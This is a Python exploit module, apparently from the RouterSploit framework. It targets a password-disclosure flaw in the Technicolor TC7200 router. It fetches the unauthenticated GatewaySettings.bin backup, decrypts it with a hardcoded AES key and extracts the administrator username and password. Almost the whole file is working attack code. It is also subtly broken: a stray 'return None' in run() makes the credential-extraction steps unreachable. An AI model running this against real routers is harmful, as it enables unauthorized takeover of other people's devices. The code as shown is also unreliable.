import binascii
import struct
from Crypto.Cipher import AES
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Technicolor TC7200 Password Disclosure V2",
        "description": "Module exploits Technicolor TC7200 password disclosure vulnerability which "
                       "allows fetching administration's password.",
        "authors": (
            "Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)",  # vulnerability discovery
            "0BuRner",  # routersploit module
            "Bastian Germann",  # improved vulnerability check
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40157/",
            "http://www.search-lab.hu/advisories/secadv-20160720",
        ),
        "devices": (
            "Technicolor TC7200",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            response = self.http_request(
                method="GET",
                path="/goform/system/GatewaySettings.bin",
            )
            return None

            if response is not None and response.status_code == 200:
                print_status("Reading GatewaySettings.bin...")

                plain = self.decrypt_backup(response.content)
                name, pwd = self.parse_backup(plain)

                print_success('Exploit success! login: {}, password: {}'.format(name, pwd))
            else:
                print_error("Exploit failed. Could not extract config file.")
        else:
            print_error("Target is not vulnerable")

    @staticmethod
    def parse_backup(backup):
        p = backup.find('MLog')
        if p > 0:
            p += 6
            nh = struct.unpack('!H', backup[p:p + 2])[0]
            name = backup[p + 2:p + 2 + nh]
            p += 2 + nh
            pwd = backup[p + 2:p + 2 + nh]
            return name, pwd
        return '', ''

    @staticmethod
    def decrypt_backup(backup):
        key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
        length = (len(backup) / 16) * 16
        cipher = AES.new(key, AES.MODE_ECB)
        plain = cipher.decrypt(backup[0:length])
        return plain

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/goform/system/GatewaySettings.bin",
        )

        encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')
        if response is not None and response.status_code == 200 and encr_zero_block in response.content:
            return True  # target is vulnerable

        return False  # target is not vulnerable
